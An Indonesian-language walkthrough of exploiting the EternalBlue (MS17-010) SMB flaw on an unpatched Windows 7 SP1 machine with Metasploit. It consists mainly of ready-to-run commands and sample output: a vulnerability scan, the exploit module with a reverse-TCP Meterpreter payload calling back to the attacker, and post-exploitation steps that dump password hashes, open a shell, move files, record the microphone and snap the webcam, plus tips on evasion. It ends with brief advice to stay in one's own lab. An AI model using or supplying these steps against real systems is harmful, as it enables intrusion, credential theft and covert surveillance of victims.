# Exploit Real Target: Windows 7 SP1 dengan EternalBlue (MS17-010)

## A. Apa Itu EternalBlue?

`EternalBlue` adalah sebuah exploit untuk kerentanan [SMB](https://en.wikipedia.org/wiki/Server_Message_Block)v1 (Server Message Block version 1) pada sistem Windows, yang ditemukan oleh [NSA](https://www.nsa.gov/) dan bocor oleh grup [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers).

- Kerentanan ini diberi ID: `CVE-2017-0144`
- Dapat digunakan untuk RCE (remote code execution) tanpa autentikasi.
- Sangat efektif terhadap `Windows XP`, `Vista`, `7`, `8`, `Server 2003`, `2008`, hingga `2012` yang belum di-patch.

## B. Alat dan Bahan

- `Kali Linux` dengan `Metasploit Framework`
- Target: `Windows 7 SP1` (belum di-patch MS17-010)
- Koneksi jaringan lokal antara attacker dan target

## C. Langkah-Langkah Eksploitasi EternalBlue

### 1. Jalankan Metasploit

```
msfconsole
```

Tunggu sampai muncul prompt seperti ini:

```
msf6 >
```

### 2. Scan Target

Sebelum melakukan eksploitasi terhadap target, langkah awal sebelum melakukan eksploitasi adalah dengan meng-scan target, apakah target rentan atau tidak.

Gunakan modul `uxiliary/scanner/smb/smb_ms17_010` dari Metasploit untuk meng-scan EternalBlue:

```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <IP_TARGET>
set RPORT 445
set verbose true
run
```

Kalau hasil output-nya seperti ini:

```
[*] 192.168.1.45:445      - Connected to \\192.168.1.45\IPC$ with TID = 2048
[*] 192.168.1.45:445      - Received STATUS_INSUFF_SERVER_RESOURCES with FID = 0
[+] 192.168.1.45:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.45:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Itu artinya target rentan terhadap eksploitasi EternalBlue.

### 3. Eksploitasi Target

Untuk melakukan eksploitasi EternalBlue gunakan modul `exploit/windows/smb/ms17_010_eternalblue` dari Metasploit:

```
use exploit/windows/smb/ms17_010_eternalblue
```

**Atur Parameter**

```
set RHOSTS <IP_TARGET>
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
```

**Jalankan Eksploit**

```
exploit
```

Jika berhasil, kamu akan mendapatkan sesi Meterpreter.

```
[*] Sending stage (203846 bytes) to 192.168.1.10
[+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 2 opened (192.168.1.5:4444 -> 192.168.1.10:49158) at 2025-05-07 20:27:03 +0700

meterpreter > 
```

Setelah berhasil mendapatkan sesi Meterpreter, kamu bisa melakukan beberapa hal diantaranya:

Melihat informasi sistem target:

```
sysinfo
```

Menampilkan User ID (UID):

```
getuid
```

Mengekstrak hash password pengguna:

```
hashdump
```                    

Membuka command shell (cmd.exe) dari mesin korban:

```
shell
```                    

Upload file ke target

```
upload 
```           

Download file dari target

```
download
```

Rekam suara dari microphone target:

```
record_mic 
```     

Ambil snapshot dari webcam target:

```
webcam_snap
```

Dan masih banyak lagi.

## D. Tips Keamanan dan Etika

- Gunakan hanya di lab atau uji coba yang kamu kelola sendiri.
- Jangan gunakan di jaringan orang lain tanpa izin.
- Windows 7 SP1 sudah tidak mendapatkan update, tapi banyak masih digunakan di sistem tua, gunakan untuk pelatihan, bukan penyerangan nyata.

## E. Catatan Tambahan

- Jika exploit gagal, coba gunakan `encoder` atau teknik `evasion`.
- Pastikan SMB port (445) pada target terbuka.
- Selalu tes di `VirtualBox`/`VMware`.
